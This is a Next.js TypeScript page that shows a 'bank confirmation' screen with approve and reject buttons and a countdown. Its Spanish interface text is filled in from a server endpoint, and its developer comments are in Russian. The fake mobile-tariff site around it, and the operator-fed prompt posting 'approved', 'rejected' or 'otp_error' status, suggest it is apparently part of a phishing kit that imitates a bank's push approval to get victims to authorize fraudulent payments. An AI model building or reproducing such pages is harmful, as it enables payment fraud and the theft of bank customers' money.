// app/push/page.tsx
'use client';

import React, { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import Header from '../tarifas-moviles/components/Header';
import Footer from '../tarifas-moviles/components/Footer';

export const dynamic = 'force-dynamic';

type PushPayload = {
  title?: string;
  body?: string;
  detail?: string;
  actionLabel?: string;
  timeoutSec?: number; // optional timeout supplied by server
  [k: string]: any;
};

export default function BankPushConfirm() {
  const router = useRouter();
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [push, setPush] = useState<PushPayload | null>(null);
  const [timeLeft, setTimeLeft] = useState<number>(120);
  const [loading, setLoading] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const [disabled, setDisabled] = useState(false);
  const intervalRef = useRef<number | null>(null);

  // Получаем sessionId, затем пытаемся загрузить pushPayload:
  useEffect(() => {
    const sid = typeof window !== 'undefined' ? localStorage.getItem('paymentSession') : null;
    if (!sid) {
      router.push('/tarifas-moviles');
      return;
    }
    setSessionId(sid);

    // 1) пробуем локально (polling/ProcessingPage кладёт сюда)
    let stored: PushPayload | null = null;
    try {
      const raw = localStorage.getItem('paymentPush');
      if (raw) stored = JSON.parse(raw);
    } catch (e) {
      stored = null;
    }

    const applyPush = (p: PushPayload | null) => {
      setPush(p);
      const t = p?.timeoutSec ? Math.max(5, Math.floor(p.timeoutSec)) : 120;
      setTimeLeft(t);
    };

    if (stored) {
      applyPush(stored);
    } else {
      // 2) если нет в localStorage — запрашиваем напрямую у сервера
      (async () => {
        try {
          const res = await fetch(`/api/payment-status-vercel?sessionId=${encodeURIComponent(sid)}&t=${Date.now()}`);
          if (!res.ok) return;
          const json = await res.json();
          if (json && json.pushPayload) {
            applyPush(json.pushPayload);
            try {
              localStorage.setItem('paymentPush', JSON.stringify(json.pushPayload));
            } catch {}
          }
        } catch (e) {
          // ignore
        }
      })();
    }

    return () => {
      // cleanup if needed
    };
  }, [router]);

  // Таймер обратного отсчёта
  useEffect(() => {
    if (intervalRef.current) {
      window.clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (timeLeft <= 0) {
      // timeout behaviour: помечаем как otp_error / rejected — решай сам; тут делаем reject
      (async () => {
        if (!sessionId) {
          router.push('/payment?error=timeout');
          return;
        }
        try {
          await fetch('/api/payment-status-vercel', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sessionId, status: 'otp_error' })
          });
        } catch {}
        router.push('/payment?error=timeout');
      })();
      return;
    }
    intervalRef.current = window.setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          if (intervalRef.current) {
            window.clearInterval(intervalRef.current);
            intervalRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000) as unknown as number;

    return () => {
      if (intervalRef.current) {
        window.clearInterval(intervalRef.current);
        intervalRef.current = null;
      }
    };
  }, [timeLeft, sessionId, router]);

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, '0')}`;
  };

  // Отправляем action на сервер
  const sendAction = async (status: 'approved' | 'rejected') => {
    if (!sessionId) {
      setActionError('Sesión no encontrada. Recarga la página.');
      return;
    }
    setLoading(true);
    setActionError(null);
    setDisabled(true);

    try {
      const body: any = { sessionId, status };
      // при необходимости можно отправить инфу о push response
      if (push?.actionLabel) body.pushResponse = push.actionLabel;

      const res = await fetch('/api/payment-status-vercel', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const json = await res.json().catch(() => null);

      if (res.ok && json && json.success !== false) {
        // почистим локальный сохранённый push
        try {
          localStorage.removeItem('paymentPush');
        } catch {}
        if (status === 'approved') {
          // плавный UX переход
          setTimeout(() => router.push('/success'), 700);
        } else {
          setTimeout(() => router.push('/payment?error=rejected'), 700);
        }
      } else {
        const msg = (json && json.error) ? json.error : 'Error en la comunicación con el servidor.';
        setActionError(msg);
        setDisabled(false);
      }
    } catch (err) {
      console.error('sendAction error', err);
      setActionError('Error de red. Inténtalo de nuevo.');
      setDisabled(false);
    } finally {
      setLoading(false);
    }
  };

  // UX: содержимое пуша
  const title = push?.title ?? 'Confirmación bancaria';
  const body = push?.body ?? 'Tu banco solicita confirmar esta operación.';
  const detail = push?.detail ?? null;
  const approveLabel = push?.actionLabel ?? 'Autorizar';

  return (
    <>
      <Header />
      <main className="bg-gray-50 font-sans min-h-screen wave-bg">
        <div className="container mx-auto px-4 py-8 md:py-12">
          <div className="max-w-md mx-auto">
            <div className="tariff-card p-8 text-center slide-in-up bg-white rounded-lg shadow">
              <div className="text-6xl mb-6 text-blue-600">
                <i className="fas fa-bell icon-breathe"></i>
              </div>

              <h1 className="text-2xl font-bold mb-3 text-gray-800">{title}</h1>

              <p className="text-gray-600 mb-4">{body}</p>

              {detail && (
                <div className="mb-4 p-3 bg-gray-50 rounded text-sm text-gray-700 border">
                  {detail}
                </div>
              )}

              <div className="mb-6 p-4 bg-yellow-50 rounded-lg">
                <div className="flex items-center justify-center gap-2 text-sm text-orange-700">
                  <i className="fas fa-clock icon-bounce"></i>
                  Tiempo restante: <strong className="ml-2">{formatTime(timeLeft)}</strong>
                </div>
              </div>

              {actionError && (
                <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm">
                  <i className="fas fa-exclamation-triangle mr-2"></i>
                  {actionError}
                </div>
              )}

              <div className="grid grid-cols-2 gap-4 mb-4">
                <button
                  onClick={() => sendAction('approved')}
                  disabled={loading || disabled}
                  className={`py-3 px-4 rounded-lg font-bold transition-all duration-200 flex items-center justify-center gap-2 ${
                    loading ? 'opacity-60 cursor-not-allowed' : 'bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white shadow'
                  }`}
                >
                  {loading ? <span>Procesando…</span> : <><i className="fas fa-check"></i>{approveLabel}</>}
                </button>

                <button
                  onClick={() => sendAction('rejected')}
                  disabled={loading || disabled}
                  className={`py-3 px-4 rounded-lg font-bold transition-all duration-200 flex items-center justify-center gap-2 ${
                    loading ? 'opacity-60 cursor-not-allowed' : 'bg-red-50 border border-red-200 hover:bg-red-100 text-red-700'
                  }`}
                >
                  {loading ? <span>Procesando…</span> : <><i className="fas fa-times"></i>Rechazar</>}
                </button>
              </div>

              <div className="text-sm text-gray-600">
                <p className="mb-2">Si no respondes, la operación quedará cancelada automáticamente.</p>
                <p className="text-xs text-gray-400">Nunca compartas tu información bancaria o códigos con terceros.</p>
              </div>

              {sessionId && (
                <div className="mt-6 text-xs text-gray-400">ID de sesión: {sessionId}</div>
              )}
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}
